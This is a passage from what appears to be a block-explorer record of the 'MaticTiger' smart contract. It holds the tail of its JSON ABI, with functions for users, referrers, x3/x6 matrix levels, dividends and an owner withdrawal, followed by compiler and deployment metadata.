ype\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"levelPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"registrationExt\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDividendPoints\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDivs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_gameOpen\",\"type\":\"bool\"}],\"name\":\"updateGameOpen\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"userEarnings\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"x3MatrixEarnings\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"x6MatrixEarnings\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"userEarningsAll\",\"outputs\":[{\"internalType\":\"uint256[13]\",\"name\":\"x3MatrixEarnings\",\"type\":\"uint256[13]\"},{\"internalType\":\"uint256[13]\",\"name\":\"x6MatrixEarnings\",\"type\":\"uint256[13]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"divClaimMark\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalPlayerDivPoints\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"divsClaimed\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"usersActiveLevelsAll\",\"outputs\":[{\"internalType\":\"bool[13]\",\"name\":\"x3LevelsActive\",\"type\":\"bool[13]\"},{\"internalType\":\"bool[13]\",\"name\":\"x6LevelsActive\",\"type\":\"bool[13]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersActiveX6Levels\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"usersHighestLevels\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"x3HighestLevel\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"x6HighestLevel\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersX3Matrix\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersX6Matrix\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_player\",\"type\":\"address\"}],\"name\":\"viewDivs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"divsAvailable\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_player\",\"type\":\"address\"}],\"name\":\"viewDivsPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"divsPercent\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"recipient1\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"recipient2\",\"type\":\"address\"}],\"name\":\"withdrawAndSplit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MaticTiger", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000c2fee4be3fac82c9ced200f97fb1d5ccbbfc2266", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://55a54ad4a133d9ecf5539ade224f76b767f3e2a0464f2c434e0f7e375f1be3da"}